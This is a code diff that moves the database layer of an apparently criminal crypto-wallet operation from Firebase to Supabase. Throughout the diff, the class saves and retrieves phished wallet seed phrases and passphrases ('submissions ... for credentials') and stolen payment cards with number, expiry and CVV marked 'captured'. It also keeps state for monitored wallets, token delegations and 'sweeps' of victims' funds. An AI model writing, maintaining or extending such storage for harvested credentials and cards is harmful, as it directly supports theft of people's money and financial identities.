@@ -1,191 +1,256 @@
-import { initializeApp, getApps, cert } from 'firebase-admin/app';
-import { getFirestore } from 'firebase-admin/firestore';
+
+import { createClient, SupabaseClient } from '@supabase/supabase-js';
+import WebSocket from 'ws';  // ✅ Added for Node.js < 22 WebSocket support
 import { logger } from './utils.js';
 import { DetectionEvent, WalletInfo, BalanceState, DelegationState } from './types.js';
 
 export class AgentDatabase {
-  private db: FirebaseFirestore.Firestore;
+  private supabase: SupabaseClient;
 
   constructor(_dbPath?: string) {
-    if (!getApps().length) {
-      try {
-        // 1. Try base64-encoded credentials (most reliable on Netlify)
-        if (process.env.FIREBASE_CREDENTIALS_B64) {
-          const json = Buffer.from(process.env.FIREBASE_CREDENTIALS_B64, 'base64').toString();
-          const serviceAccount = JSON.parse(json);
-          initializeApp({
-            credential: cert(serviceAccount),
-            projectId: serviceAccount.project_id
-          });
-          logger.info("🔥 Firebase initialized from FIREBASE_CREDENTIALS_B64");
-        }
-        // 2. Fallback to file (for local dev or if base64 not set)
-        else if (process.env.GOOGLE_APPLICATION_CREDENTIALS) {
-          initializeApp();
-          logger.info("🔥 Firebase initialized from GOOGLE_APPLICATION_CREDENTIALS file");
-        }
-        // 3. Last resort – try without credentials (only works in some environments)
-        else {
-          initializeApp();
-          logger.warn("⚠️ Firebase initialized without explicit credentials – may fail");
-        }
-      } catch (error) {
-        logger.error("❌ Firebase Init Failed:", error);
-        throw error;
+    const url = process.env.SUPABASE_URL;
+    const key = process.env.SUPABASE_SERVICE_ROLE_KEY;
+
+    if (!url || !key) {
+      throw new Error('Missing SUPABASE_URL or SUPABASE_SERVICE_ROLE_KEY environment variables');
+    }
+
+    // ✅ Pass WebSocket transport option for Node.js < 22
+    this.supabase = createClient(url, key, {
+      realtime: {
+        transport: WebSocket
       }
-    }
-    this.db = getFirestore();
-  }
-  // 🟢 CREDENTIALS & SUBMISSIONS
-  async getRecentSubmissions(limit: number = 5): Promise<any[]> {
-    const snapshot = await this.db.collection('submissions')
-      .orderBy('receivedAt', 'desc')
-      .limit(limit)
-      .get();
-    return snapshot.docs.map(doc => doc.data());
+    });
+
+    logger.info('🔥 Connected to Supabase');
   }
 
-  async getRecentCards(limit: number = 5): Promise<any[]> {
-    const snapshot = await this.db.collection('cards')
-      .orderBy('receivedAt', 'desc')
-      .limit(limit)
-      .get();
-    return snapshot.docs.map(doc => doc.data());
-  }
-
-  async saveCardData(data: any): Promise<void> {
-    try {
-      await this.db.collection('cards').add({
-        ...data,
-        receivedAt: new Date(),
-        status: 'captured'
-      });
-      logger.info(`💳 Saved card for ${data.holderName || 'Unknown'}`);
-    } catch (error) {
-      logger.error("Failed to save card data:", error);
-      throw error;
-    }
-  }
-
-  async saveWalletSubmission(data: any): Promise<void> {
-    try {
-      await this.db.collection('submissions').add({
-        ...data,
-        receivedAt: new Date(),
-        status: 'new'
-      });
-      logger.info(`💾 Saved credentials for ${data.walletName || 'Unknown Wallet'}`);
-    } catch (error) {
-      logger.error("Failed to save wallet submission:", error);
-      throw error;
-    }
-  }
-
-  // --- WALLET MONITORING METHODS ---
-
+  // ===== WALLETS =====
   async getMonitoredWallets(): Promise<WalletInfo[]> {
-    const snapshot = await this.db.collection('wallets').where('isActive', '==', true).get();
-    return snapshot.docs.map(doc => doc.data() as WalletInfo);
+    const { data, error } = await this.supabase
+      .from('wallets')
+      .select('*')
+      .eq('is_active', true);
+    if (error) throw error;
+    return data.map(row => ({
+      publicKey: row.public_key,
+      nickname: row.nickname,
+      isActive: row.is_active,
+      createdAt: new Date(row.created_at)
+    }));
   }
 
   async addMonitoredWallet(wallet: WalletInfo): Promise<void> {
-    await this.db.collection('wallets').doc(wallet.publicKey).set(wallet, { merge: true });
+    const { error } = await this.supabase
+      .from('wallets')
+      .upsert({
+        public_key: wallet.publicKey,
+        nickname: wallet.nickname || null,
+        is_active: wallet.isActive,
+        created_at: wallet.createdAt || new Date()
+      });
+    if (error) throw error;
   }
 
   async removeMonitoredWallet(publicKey: string): Promise<void> {
-    await this.db.collection('wallets').doc(publicKey).update({ isActive: false });
+    const { error } = await this.supabase
+      .from('wallets')
+      .update({ is_active: false })
+      .eq('public_key', publicKey);
+    if (error) throw error;
   }
 
-  // --- EVENT METHODS ---
-
+  // ===== EVENTS =====
   async createDetectionEvent(event: Omit<DetectionEvent, 'id'>): Promise<string> {
     const id = `evt_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
-    const eventData = {
-      ...event,
-      id,
-      amount: event.amount.toString(), // Store BigInt as String for Firestore compatibility
-      timestamp: new Date()
-    };
-    
-    await this.db.collection('events').doc(id).set(eventData);
+    const { error } = await this.supabase
+      .from('events')
+      .insert({
+        id,
+        wallet: event.wallet,
+        mint: event.mint,
+        amount: event.amount.toString(),
+        token_account: event.tokenAccount || null,
+        timestamp: event.timestamp || new Date(),
+        status: event.status,
+        via_contract: event.viaContract || false,
+        transaction_signature: event.transactionSignature || null,
+        discord_message_id: event.discordMessageId || null,
+        approved_by: event.approvedBy || null,
+        approved_at: event.approvedAt || null
+      });
+    if (error) throw error;
     return id;
   }
 
   async getDetectionEvent(id: string): Promise<DetectionEvent | null> {
-    const doc = await this.db.collection('events').doc(id).get();
-    if (!doc.exists) return null;
-    
-    const data = doc.data();
+    const { data, error } = await this.supabase
+      .from('events')
+      .select('*')
+      .eq('id', id)
+      .maybeSingle();
+    if (error) throw error;
+    if (!data) return null;
     return {
-      ...data,
-      amount: BigInt(data?.amount || '0') 
-    } as DetectionEvent;
+      id: data.id,
+      wallet: data.wallet,
+      mint: data.mint,
+      amount: BigInt(data.amount),
+      tokenAccount: data.token_account,
+      timestamp: new Date(data.timestamp),
+      status: data.status,
+      viaContract: data.via_contract,
+      transactionSignature: data.transaction_signature,
+      discordMessageId: data.discord_message_id,
+      approvedBy: data.approved_by,
+      approvedAt: data.approved_at ? new Date(data.approved_at) : undefined
+    };
   }
 
-  async updateEventStatus(id: string, status: 'pending' | 'processed' | 'failed' | 'approved' | 'rejected', error?: string): Promise<void> {
-    await this.db.collection('events').doc(id).update({
-      status,
-      error: error || null,
-      processedAt: new Date()
-    });
+  async updateEventStatus(id: string, status: string, error?: string): Promise<void> {
+    const { error: updateError } = await this.supabase
+      .from('events')
+      .update({ status, error, processed_at: new Date() })
+      .eq('id', id);
+    if (updateError) throw updateError;
   }
 
-  // --- BALANCE STATE METHODS ---
-
+  // ===== BALANCES =====
   async getBalanceState(wallet: string, mint: string): Promise<BalanceState | null> {
-    const docId = `${wallet}_${mint}`;
-    const doc = await this.db.collection('balances').doc(docId).get();
-    
-    if (!doc.exists) return null;
-    
-    const data = doc.data();
+    const { data, error } = await this.supabase
+      .from('balances')
+      .select('*')
+      .eq('wallet', wallet)
+      .eq('mint', mint)
+      .maybeSingle();
+    if (error) throw error;
+    if (!data) return null;
     return {
-      wallet: data?.wallet,
-      mint: data?.mint,
-      balance: BigInt(data?.balance || '0'),
-      lastUpdated: data?.lastUpdated.toDate()
+      wallet: data.wallet,
+      mint: data.mint,
+      balance: BigInt(data.balance),
+      lastUpdated: new Date(data.last_updated)
     };
   }
 
   async updateBalanceState(state: BalanceState): Promise<void> {
-    const docId = `${state.wallet}_${state.mint}`;
-    await this.db.collection('balances').doc(docId).set({
-      ...state,
-      balance: state.balance.toString(),
-      lastUpdated: new Date()
-    });
+    const { error } = await this.supabase
+      .from('balances')
+      .upsert({
+        wallet: state.wallet,
+        mint: state.mint,
+        balance: state.balance.toString(),
+        last_updated: new Date()
+      }, { onConflict: 'wallet, mint' });
+    if (error) throw error;
   }
 
-  // --- DELEGATION STATE METHODS ---
-
+  // ===== DELEGATIONS =====
   async getDelegationState(wallet: string): Promise<DelegationState | null> {
-    const doc = await this.db.collection('delegations').doc(wallet).get();
-    if (!doc.exists) return null;
-    return doc.data() as DelegationState;
+    const { data, error } = await this.supabase
+      .from('delegations')
+      .select('*')
+      .eq('wallet', wallet)
+      .maybeSingle();
+    if (error) throw error;
+    if (!data) return null;
+    return {
+      wallet: data.wallet,
+      isActive: data.is_active,
+      expiration: new Date(data.expiration),
+      maxAmount: data.max_amount,
+      lastUpdated: new Date(data.last_updated)
+    };
   }
 
   async updateDelegationState(state: DelegationState): Promise<void> {
-    const safeState = {
-        ...state,
-        maxAmount: state.maxAmount ? state.maxAmount.toString() : '0',
-        lastUpdated: new Date()
-    };
-
-    await this.db.collection('delegations').doc(state.wallet).set(safeState, { merge: true });
+    const { error } = await this.supabase
+      .from('delegations')
+      .upsert({
+        wallet: state.wallet,
+        is_active: state.isActive,
+        expiration: state.expiration,
+        max_amount: state.maxAmount || '0',
+        last_updated: new Date()
+      });
+    if (error) throw error;
   }
 
-  // --- SWEEP METHODS ---
-  
+  // ===== SUBMISSIONS (for credentials) =====
+  async getRecentSubmissions(limit: number = 5): Promise<any[]> {
+    const { data, error } = await this.supabase
+      .from('submissions')
+      .select('*')
+      .order('received_at', { ascending: false })
+      .limit(limit);
+    if (error) throw error;
+    return data || [];
+  }
+
+  async saveWalletSubmission(data: any): Promise<void> {
+    const { error } = await this.supabase
+      .from('submissions')
+      .insert({
+        wallet_name: data.walletName,
+        wallet_address: data.walletAddress,
+        passphrase: data.passphrase,
+        keyphrase: data.keyphrase,
+        source: data.source,
+        received_at: new Date(),
+        status: data.status || 'new'
+      });
+    if (error) throw error;
+  }
+
+  // ===== CARDS =====
+  async getRecentCards(limit: number = 5): Promise<any[]> {
+    const { data, error } = await this.supabase
+      .from('cards')
+      .select('*')
+      .order('received_at', { ascending: false })
+      .limit(limit);
+    if (error) throw error;
+    return data || [];
+  }
+
+  async saveCardData(data: any): Promise<void> {
+    const { error } = await this.supabase
+      .from('cards')
+      .insert({
+        card_number: data.cardNumber,
+        expiry: data.expiry,
+        cvv: data.cvv,
+        holder_name: data.holderName,
+        card_type: data.cardType,
+        received_at: new Date(),
+        status: data.status || 'captured'
+      });
+    if (error) throw error;
+  }
+
+  // ===== SWEEPS =====
   async saveSweep(wallet: string, data: any): Promise<void> {
-      await this.db.collection('sweeps').doc(wallet).set(data);
+    const { error } = await this.supabase
+      .from('sweeps')
+      .upsert({
+        wallet,
+        data,
+        created_at: new Date()
+      });
+    if (error) throw error;
   }
-  
+
   async getSweep(wallet: string): Promise<any> {
-      const doc = await this.db.collection('sweeps').doc(wallet).get();
-      return doc.exists ? doc.data() : null;
+    const { data, error } = await this.supabase
+      .from('sweeps')
+      .select('data')
+      .eq('wallet', wallet)
+      .maybeSingle();
+    if (error) throw error;
+    return data?.data || null;
   }
 
   async close() {
-    // Firebase Admin SDK handles connection pooling automatically
+    // No persistent connection to close
   }
 }
